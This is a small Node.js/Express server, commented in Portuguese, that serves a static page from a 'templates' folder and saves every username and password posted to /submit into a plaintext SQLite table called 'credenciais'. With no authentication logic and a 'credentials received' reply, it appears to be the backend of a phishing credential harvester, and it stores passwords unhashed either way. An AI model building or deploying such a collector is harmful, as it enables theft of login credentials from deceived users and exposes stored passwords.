const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const PORT = 3000;

// Configura o body parser para capturar dados POST
app.use(bodyParser.urlencoded({ extended: true }));

// Servir arquivos estáticos (como o index.html)
app.use(express.static("templates"));

// Conectar ao banco de dados SQLite
const db = new sqlite3.Database('db/banco.db', (err) => {
  if (err) {
    console.error('Erro ao abrir o banco de dados:', err.message);
  } else {
    console.log('Conectado ao banco de dados SQLite');
  }
});

// Criar a tabela 'credenciais' (caso não exista)
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS credenciais (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      password TEXT NOT NULL
    )
  `, (err) => {
    if (err) {
      console.error('Erro ao criar a tabela:', err.message);
    } else {
      console.log('Tabela credenciais criada com sucesso!');
    }
  });
});

// Rota para capturar os dados do formulário e salvar no banco de dados
app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // Inserir os dados no banco de dados SQLite
  const query = 'INSERT INTO credenciais (username, password) VALUES (?, ?)';
  db.run(query, [username, password], function(err) {
    if (err) {
      console.error('Erro ao inserir dados:', err.message);
      return res.send('Erro ao salvar credenciais');
    }
    console.log(`Credenciais salvas com sucesso! ID: ${this.lastID}`);
    res.send('Credenciais recebidas com sucesso!');
  });
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
